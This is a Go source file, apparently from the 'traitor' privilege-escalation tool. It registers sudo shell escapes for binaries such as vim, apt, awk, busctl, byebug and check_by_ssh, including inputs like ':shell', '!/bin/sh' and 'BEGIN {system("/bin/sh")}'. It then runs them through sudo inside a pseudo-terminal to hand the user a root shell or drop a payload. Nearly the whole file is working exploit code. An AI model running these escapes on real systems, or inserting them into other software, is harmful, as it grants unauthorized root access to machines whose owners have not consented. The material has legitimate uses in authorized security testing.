package exploits

import (
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/creack/pty"
	"github.com/liamg/traitor/pkg/logger"
	"github.com/liamg/traitor/pkg/payloads"
	"github.com/liamg/traitor/pkg/state"
	"golang.org/x/crypto/ssh/terminal"
)

type gtfobinsExploit struct {
	binaryName     string
	inputs         []string
	args           []string
	entry          *state.SudoEntry
	envs           []string
	tmpFileContent string
}

func NewGTFOBinsExploit(binaryName string, inputs []string, args []string, envs []string, tmpFileContent string) *gtfobinsExploit {
	return &gtfobinsExploit{
		binaryName:     binaryName,
		inputs:         inputs,
		args:           args,
		envs:           envs,
		tmpFileContent: tmpFileContent,
	}
}

func registerGTFOBinsExploit(binaryName string, args []string, inputs []string, envs []string, tmpFileContent string) {
	register(
		fmt.Sprintf("gtfobins:%s", binaryName),
		SpeedFast,
		NewGTFOBinsExploit(binaryName, inputs, args, envs, tmpFileContent),
	)
}

func init() {
	registerGTFOBinsExploit(
		"vim",
		nil,
		[]string{
			":set shell=/bin/sh\n",
			":shell\n",
		},
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"apt-get",
		[]string{
			"changelog", "apt",
		},
		[]string{
			"!/bin/sh\n",
		},
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"apt",
		[]string{
			"changelog", "apt",
		},
		[]string{
			"!/bin/sh\n",
		},
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"ash",
		nil,
		nil,
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"awk",
		[]string{
			"'BEGIN {system(\"/bin/sh\")}'",
		},
		nil,
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"bash",
		nil,
		nil,
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"bundler",
		[]string{"help"},
		[]string{"!/bin/sh"},
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"busctl",
		[]string{"--show-machine"},
		[]string{"!/bin/sh"},
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"busybox",
		[]string{"sh"},
		nil,
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"byebug",
		[]string{"$PWNFILE"},
		[]string{"continue"},
		nil,
		"system(\"/bin/sh\")\n",
	)
	registerGTFOBinsExploit(
		"capsh",
		[]string{"--"},
		nil,
		nil,
		"",
	)
	registerGTFOBinsExploit(
		"check_by_ssh",
		[]string{
			"-o",
			"\"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\"",
			"-H",
			"localhost",
			"-C",
			"xx",
		},
		nil,
		nil,
		"",
	)
}

func (v *gtfobinsExploit) IsVulnerable(_ context.Context, state *state.State, log logger.Logger) bool {
	entry, err := state.SudoEntries.GetEntryForBinary(
		v.binaryName,
		state.HasPassword,
	)
	if err != nil || entry == nil {
		return false
	}
	if entry.AllCommands {
		if _, err := exec.LookPath(v.binaryName); err != nil {
			return false
		}
	} else if len(v.args) > 0 && len(strings.Split(entry.Command, " ")) > 1 {
		return false
	}
	v.entry = entry
	return true
}

func (v *gtfobinsExploit) Shell(ctx context.Context, s *state.State, log logger.Logger) error {
	return v.Exploit(ctx, s, log, payloads.Defer)
}

func (v *gtfobinsExploit) Exploit(ctx context.Context, s *state.State, log logger.Logger, payload payloads.Payload) error {

	command := v.entry.Command
	if v.entry.AllCommands {
		binaryPath, err := exec.LookPath(v.binaryName)
		if err != nil {
			return err
		}
		command = binaryPath
	}

	log.Printf("Using command '%s'...", command)

	args := strings.Split(command, " ")

	if len(v.args) > 0 {
		args = append(args, v.args...)
	}

	if !s.HasPassword {
		args = append([]string{"-n"}, args...)
	}

	cmd := exec.Command("sudo", args...)

	if len(v.envs) > 0 {
		log.Printf("Adding env var(s)...")
		cmd.Env = append(os.Environ(), v.envs...)
	}

	if v.tmpFileContent != "" {

		log.Printf("Writing temporary file...")

		tempFile, err := ioutil.TempFile(os.TempDir(), "t")
		if err != nil {
			return err
		}
		if _ , err := tempFile.Write([]byte(v.tmpFileContent)); err != nil {
			_ = tempFile.Close()
			return err
		}
		if err := tempFile.Close(); err != nil {
			return err
		}
		cmd.Env = append(cmd.Env, fmt.Sprintf("PWNFILE=%s", tempFile.Name()))
	}

	log.Printf("Starting command with pty...")

	// Start the command with a pty.
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return err
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	log.Printf("Setting up terminal...")

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			_ = pty.InheritSize(os.Stdin, ptmx)
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return err
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	expChan := make(chan error)

	log.Printf("Exploiting and dropping payload...")

	go func() {
		for _, input := range v.inputs {
			time.Sleep(time.Millisecond * 100)
			if _, err := ptmx.Write([]byte(input)); err != nil {
				expChan <- err
				return
			}
		}
		if payload != payloads.Defer {
			time.Sleep(time.Millisecond * 200)
			if _, err := ptmx.Write([]byte(payload)); err != nil {
				expChan <- err
				return
			}
		}
		expChan <- nil
	}()

	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
	_, _ = io.Copy(os.Stdout, ptmx)

	return <-expChan
}
